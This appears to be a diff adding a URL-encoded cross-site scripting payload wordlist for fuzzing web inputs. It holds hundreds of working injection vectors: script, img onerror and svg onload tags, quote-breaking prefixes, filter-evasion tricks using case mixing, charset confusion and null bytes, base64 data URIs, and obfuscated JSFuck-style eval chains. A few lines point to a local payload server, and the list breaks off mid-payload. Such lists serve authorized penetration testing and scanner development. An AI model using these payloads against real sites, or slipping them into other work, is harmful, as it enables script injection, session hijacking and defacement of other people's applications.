+%22%3E%3Cscript%20async%3Ealert(1);%3C/script%20async%3E  
+'%3E%3Cscript%20async%3Ealert(1);%3C/script%20async%3E  
+%3Cscript%20charset%3Ealert(1);%3C/script%20charset%3E  
+%22%3E%3Cscript%20charset%3Ealert(1);%3C/script%20charset%3E  
+'%3E%3Cscript%20charset%3Ealert(1);%3C/script%20charset%3E  
+%3Cscript%20a%20b%20c%20%3Ealert(1)%3C/script%20d%20e%20f%3E  
+%22%3E%3Cscript%20a%20b%20c%20%3Ealert(1)%3C/script%20d%20e%20f%3E  
+'%3E%3Cscript%20a%20b%20c%20%3Ealert(1)%3C/script%20d%20e%20f%3E  
+%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%22%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+'%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%22%3E%3Cimg%20src=x%20onerror=prompt(1)%3E  
+'%3E%3Cimg%20src=x%20onerror=prompt(1)%3E  
+%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%22%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+'%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%22%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+'%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%22%3E%3Cimg%20src=x%20onerror=prompt(1)%3E  
+'%3E%3Cimg%20src=x%20onerror=prompt(1)%3E  
+%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%22%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+'%3E%3Cimg%20src=x%20onerror=document.body.innerHTML=location.hash%3E  
+%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+%22%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+'%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+%22%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+'%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+%22%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+'%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+%22%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+'%3E%3Csvg%20onload=document.body.innerHTML=location.hash%3E  
+--!%3E%3Csvg%20onload=prompt(1)  
+eval(((_=!1)+%7B%7D)[1]+(_+%7B%7D)[2]+(_+%7B%7D)[4]+((_=!!1)+%7B%7D)[1]+(_+%7B%7D)[0]+((_=%3E(_))+1)[3]+1+((_=%3E(_))+1)[5])  
+eval((_=!0+(()=%3E0)+!1)[10]+_[11]+_[3]+_[1]+_[0]+_[4]+1+_[5])  
+%3Cmarquee%3Ealert(%20%60X%20:)%60)%3C/marquee%3E  
+%22%3E%3Cmarquee%3Ealert(%20%60X%20:)%60)%3C/marquee%3E  
+'%3E%3Cmarquee%3Ealert(%20%60X%20:)%60)%3C/marquee%3E  
+%3C%22script%22%3E%22alert(0)%22%3C/%22script%22%3E  
+%22%3E%3C%22script%22%3E%22alert(0)%22%3C/%22script%22%3E  
+'%3E%3C%22script%22%3E%22alert(0)%22%3C/%22script%22%3E  
+%3Cs[NULL]cript%3Ealert(1)%3C/s[NULL]cript%3E'%3EX%3C/a%3E  
+%22%3E%3Cs[NULL]cript%3Ealert(1)%3C/s[NULL]cript%3E'%3EX%3C/a%3E  
+'%3E%3Cs[NULL]cript%3Ealert(1)%3C/s[NULL]cript%3E'%3EX%3C/a%3E  
+%3Cvideo%3E%3Csource%20o?UTF-8?Q?n?error=%22alert(1)%22%3E  
+%22%3E%3Cvideo%3E%3Csource%20o?UTF-8?Q?n?error=%22alert(1)%22%3E  
+'%3E%3Cvideo%3E%3Csource%20o?UTF-8?Q?n?error=%22alert(1)%22%3E  
+%3Cbody%20scroll=alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+%22%3E%3Cbody%20scroll=alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+'%3E%3Cbody%20scroll=alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+%3Cmeta%20charset=%22x-mac-farsi%22%3E%C3%82%C2%BCscript%20%C3%82%C2%BEalert(1)//%C3%82%C2%BC/script%20%C3%82%C2%BE  
+%22%3E%3Cmeta%20charset=%22x-mac-farsi%22%3E%C3%82%C2%BCscript%20%C3%82%C2%BEalert(1)//%C3%82%C2%BC/script%20%C3%82%C2%BE  
+'%3E%3Cmeta%20charset=%22x-mac-farsi%22%3E%C3%82%C2%BCscript%20%C3%82%C2%BEalert(1)//%C3%82%C2%BC/script%20%C3%82%C2%BE  
+%3Cx%20onload'=alert(1)  
+%22%3E%3Cx%20onload'=alert(1)  
+'%3E%3Cx%20onload'=alert(1)  
+%3Csc'+'ript%3Ealert(1)%3C/script%3E  
+%22%3E%3Csc'+'ript%3Ealert(1)%3C/script%3E  
+'%3E%3Csc'+'ript%3Ealert(1)%3C/script%3E  
+%3CFRAMESET%3E%3CFRAME%20RC=%22%22+%22javascript:alert('X');%22%3E%3C/FRAMESET%3E  
+%22%3E%3CFRAMESET%3E%3CFRAME%20RC=%22%22+%22javascript:alert('X');%22%3E%3C/FRAMESET%3E  
+'%3E%3CFRAMESET%3E%3CFRAME%20RC=%22%22+%22javascript:alert('X');%22%3E%3C/FRAMESET%3E  
+%3C/script%3E%22//'//%3Csvg%0Aonload=alert(1)//%3E  
+%22%3E%3C/script%3E%22//'//%3Csvg%0Aonload=alert(1)//%3E  
+'%3E%3C/script%3E%22//'//%3Csvg%0Aonload=alert(1)//%3E  
+'//%3C/script%3E%3Csvg%20%22%0aonload=alert(1)%20//%3E  
+%3C/script%3E'//%3Csvg%20%22%0Aonload=alert(1)%20//%3E  
+%22%3E%3C/script%3E'//%3Csvg%20%22%0Aonload=alert(1)%20//%3E  
+'%3E%3C/script%3E'//%3Csvg%20%22%0Aonload=alert(1)%20//%3E  
+'//%3C/script%3E%3Csvg%20%22%0Aonload=alert(1)//%20/%3E  
+%3C/script%3E%22//'//%3Csvg%0Aonload=alert(1)%20//%3E  
+%22%3E%3C/script%3E%22//'//%3Csvg%0Aonload=alert(1)%20//%3E  
+'%3E%3C/script%3E%22//'//%3Csvg%0Aonload=alert(1)%20//%3E  
+%3C/script%3E'//%3Csvg%20%22%0Aonload=alert(1)//%20/%3E  
+%22%3E%3C/script%3E'//%3Csvg%20%22%0Aonload=alert(1)//%20/%3E  
+'%3E%3C/script%3E'//%3Csvg%20%22%0Aonload=alert(1)//%20/%3E  
+%3C/script%20%22//'//%3E%3Csvg%0Aonload=alert(1)//%3E  
+%22%3E%3C/script%20%22//'//%3E%3Csvg%0Aonload=alert(1)//%3E  
+'%3E%3C/script%20%22//'//%3E%3Csvg%0Aonload=alert(1)//%3E  
+';//%3C/script%3E%3Csvg%20%22;%0Aonload=alert(1)//%20/%3E  
+%3C/script%3E%3Cimg%20src%20'//%22%0Aonerror=alert(1)//  
+%22%3E%3C/script%3E%3Cimg%20src%20'//%22%0Aonerror=alert(1)//  
+'%3E%3C/script%3E%3Cimg%20src%20'//%22%0Aonerror=alert(1)//  
+%3C/script%3E%3Csvg%20onload='-/%22/-[alert(1)]//'/%3E  
+%22%3E%3C/script%3E%3Csvg%20onload='-/%22/-[alert(1)]//'/%3E  
+'%3E%3C/script%3E%3Csvg%20onload='-/%22/-[alert(1)]//'/%3E  
+%3C/script%3E%3Cimg%20'//%22%0Aonerror=alert(1)//%20src%3E  
+%22%3E%3C/script%3E%3Cimg%20'//%22%0Aonerror=alert(1)//%20src%3E  
+'%3E%3C/script%3E%3Cimg%20'//%22%0Aonerror=alert(1)//%20src%3E  
+%3C/script%3E%3Cimg%20'//%22%0Aonerror=alert(1)//%20src=1%3E  
+%22%3E%3C/script%3E%3Cimg%20'//%22%0Aonerror=alert(1)//%20src=1%3E  
+'%3E%3C/script%3E%3Cimg%20'//%22%0Aonerror=alert(1)//%20src=1%3E  
+%3C/script%20%22/*'/*%3E%3Csvg%20*/;%20onload=alert(1)%20//%3E  
+%22%3E%3C/script%20%22/*'/*%3E%3Csvg%20*/;%20onload=alert(1)%20//%3E  
+'%3E%3C/script%20%22/*'/*%3E%3Csvg%20*/;%20onload=alert(1)%20//%3E  
+%3C/script%3E%3Cscript%3E/*%22/*'/**/;alert(1)//%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%3E/*%22/*'/**/;alert(1)//%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%3E/*%22/*'/**/;alert(1)//%3C/script%3E  
+%3C/script%20%22/*'/*%3E%3Cimg/src=x%20*/;%20onerror=alert(1)%20//  
+%22%3E%3C/script%20%22/*'/*%3E%3Cimg/src=x%20*/;%20onerror=alert(1)%20//  
+'%3E%3C/script%20%22/*'/*%3E%3Cimg/src=x%20*/;%20onerror=alert(1)%20//  
+%3C/script%3E%3Cscript%3E/*var%20a=%22/*%22%22'/**/;alert(1);//%3C/script%3E  
+%22%3E%3C/script%3E%3Cscript%3E/*var%20a=%22/*%22%22'/**/;alert(1);//%3C/script%3E  
+'%3E%3C/script%3E%3Cscript%3E/*var%20a=%22/*%22%22'/**/;alert(1);//%3C/script%3E  
+%3Ciframe%2
+%22%3E%3Ciframe%2
+'%3E%3Ciframe%2
+'%20style='width:expression(prompt(1));  
+%22width:expression(prompt(1))  
+width:/0065/0078/0070/0072/0065/0073/0073/0069/006F/006E/0028/0070/0072/006F/006D/0070/0074/0028/0031/0029/0029  
+javascript:prompt(1)  
+javascript:/u0070rompt&  
+jAvAsCrIpT&colon;prompt&lpar;1&rpar;  
+http://jsfiddle.net/xboz/c7vvkedv/  
+%3CEMBED%20SRC=%22data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==%22%20type=%22image/svg+xml%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E  
+%22%3E%3CEMBED%20SRC=%22data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==%22%20type=%22image/svg+xml%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E  
+'%3E%3CEMBED%20SRC=%22data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH%20A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv%20MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs%20aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw%20IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh%20TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==%22%20type=%22image/svg+xml%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E  
+%3CDIV%20STYLE=%22width:/0065/0078/0070/0072/0065/0073/0073/0069/006F/006E/0028/0070/0072/006F/006D/0070/0074/0028/0031/0029/0029%22%3E  
+%22%3E%3CDIV%20STYLE=%22width:/0065/0078/0070/0072/0065/0073/0073/0069/006F/006E/0028/0070/0072/006F/006D/0070/0074/0028/0031/0029/0029%22%3E  
+'%3E%3CDIV%20STYLE=%22width:/0065/0078/0070/0072/0065/0073/0073/0069/006F/006E/0028/0070/0072/006F/006D/0070/0074/0028/0031/0029/0029%22%3E  
+data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=  
+data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+cHJvbXB0KDEpOzwvc2NyaXB0Pjwvc3ZnPg==  
+data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=  
+data:text/html;,&  
+%60%60onerror=prompt(1)  
+alert(/XSS/);  
+1;alert(/XSS/);  
+1';alert(/XSS/);x='1  
+';alert(/XSS/);'  
+%3Csvg%3E%3Cscript%3Eprompt&  
+%22%3E%3Csvg%3E%3Cscript%3Eprompt&  
+'%3E%3Csvg%3E%3Cscript%3Eprompt&  
+%3Chtml%3E%20%3Cscript%3E%20var%20a=%22%3C/script%3E%3Cscript%3Ealert(1)//%22;%3C/script%3E%20%3C/html%3E  
+%22%3E%3Chtml%3E%20%3Cscript%3E%20var%20a=%22%3C/script%3E%3Cscript%3Ealert(1)//%22;%3C/script%3E%20%3C/html%3E  
+'%3E%3Chtml%3E%20%3Cscript%3E%20var%20a=%22%3C/script%3E%3Cscript%3Ealert(1)//%22;%3C/script%3E%20%3C/html%3E  
+&  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'';%7D%7D%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+%3Cbody%20onpageshow=alert(1)%3E  
+%22%3E%3Cbody%20onpageshow=alert(1)%3E  
+'%3E%3Cbody%20onpageshow=alert(1)%3E  
+%3Cbody%20onpageshow=alert(1);%3E  
+%22%3E%3Cbody%20onpageshow=alert(1);%3E  
+'%3E%3Cbody%20onpageshow=alert(1);%3E  
+%3Cbody/onpageshow=alert(1)%3E  
+%22%3E%3Cbody/onpageshow=alert(1)%3E  
+'%3E%3Cbody/onpageshow=alert(1)%3E  
+%3Cbody/onpageshow=alert(1);%3E  
+%22%3E%3Cbody/onpageshow=alert(1);%3E  
+'%3E%3Cbody/onpageshow=alert(1);%3E  
+%22%3E%3Cb/onclick=%22javascript:window.window.window['alert'](1)%22%3Ebold  
+%3Cbody%20language=vbs%20onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='%3E  
+%22%3E%3Cbody%20language=vbs%20onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='%3E  
+'%3E%3Cbody%20language=vbs%20onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='%3E  
+behaviour:url/0028javascript:alert/0028[0][0]/0029/0029  
+%3Ciframe%20src=%22javascript:x:alert(1)%22%3E  
+%22%3E%3Ciframe%20src=%22javascript:x:alert(1)%22%3E  
+'%3E%3Ciframe%20src=%22javascript:x:alert(1)%22%3E  
+%3Ca%20href=%22javascript:x:alert(1)%22%3Ex%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript:x:alert(1)%22%3Ex%3C/a%3E  
+'%3E%3Ca%20href=%22javascript:x:alert(1)%22%3Ex%3C/a%3E  
+%3Ca%20href=j&  
+%22%3E%3Ca%20href=j&  
+'%3E%3Ca%20href=j&  
+%3Cdiv%20contextmenu=x%3Eright-click%3Cmenu%20id=x%20onshow=alert(1)%3E  
+%22%3E%3Cdiv%20contextmenu=x%3Eright-click%3Cmenu%20id=x%20onshow=alert(1)%3E  
+'%3E%3Cdiv%20contextmenu=x%3Eright-click%3Cmenu%20id=x%20onshow=alert(1)%3E  
+%22;document.body.addEventListener(%22DOMActivate%22,alert(1))//  
+/*@cc_on%20@if(1)alert(1)@end  
+var%20a=0;%20((a%20==%201)%20?%202%20:%20alert(1));//  
+(0)['constructor']['constructor'](%22/141/154/145/162/164(1)%22)();  
+%3Cinput%20oninput=alert(1)%3E  
+%22%3E%3Cinput%20oninput=alert(1)%3E  
+'%3E%3Cinput%20oninput=alert(1)%3E  
+%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=//a.a%3E  
+%22%3E%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=//a.a%3E  
+'%3E%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=//a.a%3E  
+%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=x%3E  
+%22%3E%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=x%3E  
+'%3E%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=x%3E  
+%3Cvideo/onprogress=alert(1)%3E%3Csource/src=//a.a%3E  
+%22%3E%3Cvideo/onprogress=alert(1)%3E%3Csource/src=//a.a%3E  
+'%3E%3Cvideo/onprogress=alert(1)%3E%3Csource/src=//a.a%3E  
+%3Cvideo/onprogress=alert(1)%3E%3Csource/src=x%3E  
+%22%3E%3Cvideo/onprogress=alert(1)%3E%3Csource/src=x%3E  
+'%3E%3Cvideo/onprogress=alert(1)%3E%3Csource/src=x%3E  
+%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg%3E  
+%22%3E%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg%3E  
+'%3E%3Cvideo%20onprogress=alert(1)%3E%3Csource%20src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg%3E  
+%3Cvideo/onprogress=alert(1)%3E%3Csource/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg%3E  
+%22%3E%3Cvideo/onprogress=alert(1)%3E%3Csource/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg%3E  
+'%3E%3Cvideo/onprogress=alert(1)%3E%3Csource/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg%3E  
+%3Csvg%20onload=/u0061lert(1)%3E  
+%22%3E%3Csvg%20onload=/u0061lert(1)%3E  
+'%3E%3Csvg%20onload=/u0061lert(1)%3E  
+%3Cmeta%20charset=HZ-GB-2312%3E%3Cscrip~%7Dt%3Ealert(1)%3C/scrip~%7Dt%3E  
+%22%3E%3Cmeta%20charset=HZ-GB-2312%3E%3Cscrip~%7Dt%3Ealert(1)%3C/scrip~%7Dt%3E  
+'%3E%3Cmeta%20charset=HZ-GB-2312%3E%3Cscrip~%7Dt%3Ealert(1)%3C/scrip~%7Dt%3E  
+%3Cmeta%20charset=HZ-GB-2312%3E%3Cscrip~%7Dt%3Ealert(1)%3C/script%3E  
+%22%3E%3Cmeta%20charset=HZ-GB-2312%3E%3Cscrip~%7Dt%3Ealert(1)%3C/script%3E  
+'%3E%3Cmeta%20charset=HZ-GB-2312%3E%3Cscrip~%7Dt%3Ealert(1)%3C/script%3E  
+%3Cmeta%20charset=utf-7%3E%3Cimg%20src=x%20o%2BAG4-error=alert(1)%3E  
+%22%3E%3Cmeta%20charset=utf-7%3E%3Cimg%20src=x%20o%2BAG4-error=alert(1)%3E  
+'%3E%3Cmeta%20charset=utf-7%3E%3Cimg%20src=x%20o%2BAG4-error=alert(1)%3E  
+%3Cmeta%20charset=Shift_JIS%3E%3Cscript%3Ex=%22%E3%81%8F/%22;alert(1)//%22%3C/script%3E  
+%22%3E%3Cmeta%20charset=Shift_JIS%3E%3Cscript%3Ex=%22%E3%81%8F/%22;alert(1)//%22%3C/script%3E  
+'%3E%3Cmeta%20charset=Shift_JIS%3E%3Cscript%3Ex=%22%E3%81%8F/%22;alert(1)//%22%3C/script%3E  
+this[%22alert%22](%22X%22)  
+this['alert'](1)  
+%3Cscript%3Ethis[%22alert%22](%22X%22)%3C/script%3E  
+%22%3E%3Cscript%3Ethis[%22alert%22](%22X%22)%3C/script%3E  
+'%3E%3Cscript%3Ethis[%22alert%22](%22X%22)%3C/script%3E  
+%3Csvg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//  
+%22%3E%3Csvg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//  
+'%3E%3Csvg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//  
+%3Csvg%0Conload=alert(1)%3E  
+%22%3E%3Csvg%0Conload=alert(1)%3E  
+'%3E%3Csvg%0Conload=alert(1)%3E  
+%3Csvg%3E%3Cuse%20xlink:href=%22data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=  
+%22%3E%3Csvg%3E%3Cuse%20xlink:href=%22data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=  
+'%3E%3Csvg%3E%3Cuse%20xlink:href=%22data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=  
+%22-alert(1)-%22  
+%22/alert(1)/%22  
+%22%7Calert(1)%7C%22  
+==alert(1)==  
+[alert(1)]+  
+%5Ealert(1)%5E  
+%7Calert(1)%7C  
+&alert(1)&  
+%3E%3Ealert(1)%3E%3E  
+%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E  
+%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%7C/u0061lert()%7C'  
+%3Cstyle%0conload=alert(1)%3E  
+%22%3E%3Cstyle%0conload=alert(1)%3E  
+'%3E%3Cstyle%0conload=alert(1)%3E  
+%3CScR%3CScRiPt%3EIpT%3Eprompt(1)%3C%2FsCr%3CScRiPt%3EIpT%3E  
+%22%3E%3CScR%3CScRiPt%3EIpT%3Eprompt(1)%3C%2FsCr%3CScRiPt%3EIpT%3E  
+'%3E%3CScR%3CScRiPt%3EIpT%3Eprompt(1)%3C%2FsCr%3CScRiPt%3EIpT%3E  
+%3Cscrip%3Cscript%3Et%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscrip%3Cscript%3Et%3Ealert(1)%3C/script%3E  
+'%3E%3Cscrip%3Cscript%3Et%3Ealert(1)%3C/script%3E  
+javasCript:eval%28'aler'+'t'+'%28%29'%29  
+&quot;&gt;&lt;img%20src=x%20onerror=confirm(1);&gt;  
+Data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==  
+%3Cimg%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29%3E  
+%22%3E%3Cimg%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29%3E  
+'%3E%3Cimg%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29%3E  
+%3CIMG%20SRC=%22javascript:alert('X');%22%3E  
+%22%3E%3CIMG%20SRC=%22javascript:alert('X');%22%3E  
+'%3E%3CIMG%20SRC=%22javascript:alert('X');%22%3E  
+%3CBODY%20onload!  
+%22%3E%3CBODY%20onload!  
+'%3E%3CBODY%20onload!  
+/%22;alert('X');//  
+&  
+%27;%20confirm(1);%20%27  
+&apos;;%20confirm(1);%20&apos;  
+/u0027%20confirm(1);%20/u0027  
+%22;%20[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+